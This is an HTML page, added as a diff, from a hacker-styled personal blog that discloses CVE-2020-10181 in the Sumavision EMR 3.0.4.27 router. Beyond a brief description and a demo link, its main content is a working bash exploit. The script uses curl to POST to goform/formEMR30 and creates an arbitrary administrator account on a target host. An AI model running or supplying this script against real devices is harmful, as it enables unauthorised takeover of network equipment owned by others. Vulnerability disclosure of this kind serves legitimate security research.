@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>s1kr10s // Sumavision EMR3.0</title>
+  <link rel="shortcut icon" href="../images/icon.png">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+    :root { --green:#00ff41; --green-dim:#00b32c; --green-dark:#003b0f; --cyan:#00ffff; --bg:#000; --scanline:rgba(0,255,65,0.03); }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html { overflow-y:scroll; }
+    html,body { background:var(--bg); color:var(--green); font-family:'Share Tech Mono','Courier New',monospace; overflow-x:hidden; min-height:100vh; }
+    body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg,transparent,transparent 2px,var(--scanline) 2px,var(--scanline) 4px); pointer-events:none; z-index:9999; }
+    body::after { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at center,transparent 60%,rgba(0,0,0,0.85) 100%); pointer-events:none; z-index:9998; }
+    canvas#matrix { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.07; }
+    .wrapper { position:relative; z-index:10; max-width:1100px; margin:0 auto; padding:0 20px; }
+    nav { border-bottom:1px solid var(--green-dim); padding:12px 0; }
+    nav ul { list-style:none; display:flex; flex-wrap:wrap; gap:5px; align-items:center; }
+    nav ul li a { color:var(--green-dim); text-decoration:none; padding:4px 12px; border:1px solid transparent; font-size:0.9rem; letter-spacing:1px; transition:all 0.15s; }
+    nav ul li a:hover { color:var(--green); border-color:var(--green); text-shadow:0 0 8px var(--green); background:rgba(0,255,65,0.05); }
+    nav .brand { color:var(--green); font-size:1rem; letter-spacing:2px; text-shadow:0 0 10px var(--green); margin-right:auto; }
+    .page-header { padding:30px 0 5px; }
+    .prompt-line { color:var(--green); font-size:1.05rem; margin-bottom:25px; text-shadow:0 0 5px var(--green); }
+    .prompt-line .user { color:var(--cyan); text-shadow:0 0 8px var(--cyan); }
+    .prompt-line .path { color:var(--green-dim); }
+    .cursor { display:inline-block; width:9px; height:1em; background:var(--green); vertical-align:text-bottom; animation:blink 1s step-end infinite; box-shadow:0 0 8px var(--green); }
+    @keyframes blink { 50%{opacity:0;} }
+    .post-container { padding:5px 0 40px; }
+    .post-title { color:var(--green); font-size:1.3rem; text-shadow:0 0 8px var(--green); padding:10px 0 15px; letter-spacing:1px; }
+    .post-hr { border:none; border-top:1px solid var(--green-dark); margin:0 0 25px; }
+    .post-body { color:#c0d8c0; font-size:0.95rem; line-height:1.8; }
+    .post-body img { max-width:100%; height:auto; border-radius:4px; border:1px solid var(--green-dark); }
+    .post-body textarea, .post-body textarea.form-control { background:#030a03 !important; color:#00ff41 !important; border:1px solid var(--green-dark) !important; font-family:'Share Tech Mono','Courier New',monospace !important; font-size:0.78rem !important; padding:12px !important; width:100% !important; resize:none; line-height:1.5 !important; margin:5px 0; }
+    .post-body a { color:var(--cyan) !important; text-decoration:none; }
+    .post-body a:hover { text-shadow:0 0 6px var(--cyan); text-decoration:underline; }
+    .post-body hr { border:none; border-top:1px solid var(--green-dark); margin:10px 0; }
+    footer { border-top:1px solid var(--green-dark); padding:20px 0; margin-top:20px; color:var(--green-dark); font-size:0.75rem; letter-spacing:1px; }
+    footer a { color:var(--green-dim); text-decoration:none; }
+    footer a:hover { color:var(--green); text-shadow:0 0 6px var(--green); }
+    ::-webkit-scrollbar { width:6px; background:#000; }
+    ::-webkit-scrollbar-thumb { background:var(--green-dark); }
+  </style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrapper">
+  <nav>
+    <ul>
+      <li><span class="brand">&gt; </span></li>
+      <li><a href="../index.html">[ ~/Start ]</a></li>
+      <li><a href="../whoami.html">[ ~/Whoami ]</a></li>
+      <li><a href="../ctf/ctf.html">[ ~/CTF's ]</a></li>
+    </ul>
+  </nav>
+  <div class="page-header">
+    <div class="prompt-line">
+      <span class="user">root</span>@<span class="host">pwn</span>:<span class="path">~/post</span>$ cat sumavision.txt
+      <span class="cursor"></span>
+    </div>
+  </div>
+  <div class="post-container">
+    <h2 class="post-title">Sumavision EMR3.0 — CVE-2020-10181</h2>
+    <hr class="post-hr">
+    <div class="post-body">
+      <p>
+        Enhanced Multimedia Router version 3.0.4.27 suffers from a cross site request forgery vulnerability.
+        <br><br>
+        <font size="6"><b>[Description]</b></font><br><br>
+        goform/formEMR30 in Sumavision Enhanced Multimedia Router (EMR) 3.0.4.27 allows creation of arbitrary users with elevated privileges (administrator) on a device, as demonstrated by a setString=new_user&lt;*1*&gt;administrator&lt;*1*&gt;123456 request.
+        <br><br>
+        <font size="6"><b>[Code]</b></font><br><br>
+        <textarea rows="20" cols="100" disabled>
+# Miguel Mendez Z.
+# @s1kr10s
+
+echo ""
+read -p "Set Hostname: " host
+read -p "Set username: " user
+echo "(The password should be between 6 and 32 in length)"
+read -p "Set password: " pass
+echo
+echo "[+] creating user..."
+sleep 2
+postdata=$(curl -X POST -d "type=11&cmd=3&language=0&slotNo=255&setString=$user<*1*>administrator<*1*>$pass" "http://$host/goform/formEMR30" -s | grep -i "0")
+if echo "$postdata" | grep -q "0</html>"; then
+  echo "[+] http://$host/frame_en.asp"
+  echo "[+] created access($user - $pass)"
+else
+  echo "[-] user not created"
+fi
+        </textarea>
+        <br><br>
+        <font size="6"><b>[Demo Video]</b></font><br><br>
+        <a href="https://www.youtube.com/watch?v=Ufcj4D9eA5o" target="_blank">https://www.youtube.com/watch?v=Ufcj4D9eA5o</a>
+        <br><br>
+      </p>
+    </div>
+  </div>
+  <footer>
+    <span>// &nbsp; root@pwn:~$ echo "The quieter you become, the more you are able to hear." &nbsp; // &nbsp;</span>
+    <a href="https://github.com/s1kr10s" target="_blank">github</a> &nbsp;|&nbsp;
+    <a href="https://x.com/s1kr10s" target="_blank">twitter/x</a> &nbsp;|&nbsp;
+    <a href="https://medium.com/@s1kr10s" target="_blank">medium</a>
+  </footer>
+</div>
+<script>
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+  resize(); window.addEventListener('resize', resize);
+  const chars = '01アイウエオカキクケコ<>{}[]\\!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  const fontSize = 13;
+  let cols = Math.floor(window.innerWidth / fontSize);
+  let drops = Array(cols).fill(1);
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff41'; ctx.font = fontSize + 'px Share Tech Mono, monospace';
+    cols = Math.floor(canvas.width / fontSize);
+    if (drops.length < cols) drops = drops.concat(Array(cols - drops.length).fill(1));
+    for (let i = 0; i < cols; i++) {
+      const c = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(c, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 50);
+</script>
+</body>
+</html>
